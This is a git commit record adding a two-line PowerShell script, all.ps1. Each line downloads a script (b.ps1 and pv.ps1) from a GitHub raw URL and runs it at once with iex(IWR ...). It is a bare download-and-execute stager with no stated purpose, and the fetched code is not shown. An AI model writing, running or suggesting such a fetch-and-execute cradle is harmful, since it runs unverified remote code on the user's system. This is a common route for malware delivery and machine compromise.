14489d65c99cb1d9a7dc9a18f9e9f09b8abb811d
justsomedummythings <148684330+justsomedummythings@users.noreply.github.com>
2023-10-22 15:50:28 +0300

    Create all.ps1

---
+++ all.ps1
@@ -0,0 +1,2 @@
+iex(IWR https://raw.githubusercontent.com/justsomedummythings/testing/main/b.ps1 -UseBasicParsing);
+iex(IWR https://raw.githubusercontent.com/justsomedummythings/testing/main/pv.ps1 -UseBasicParsing);
